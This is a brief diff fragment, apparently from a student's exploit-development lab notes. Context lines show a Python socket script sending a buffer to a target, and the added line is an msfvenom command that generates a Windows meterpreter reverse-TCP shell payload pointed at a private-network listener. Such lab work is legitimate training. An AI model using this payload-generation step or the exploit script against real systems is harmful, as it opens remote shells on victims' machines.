@@ -11,3 +11,9 @@
  11 s.send(buf)                       #send the variable buf
  12 print s.recv(1024)                #print response
  13 s.close()
+
+
+
+
+student@lin-ops:~/Windows_Demo$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.31.252 lport=5150 -b"x\00' -f python ----> PAYLOAD
+
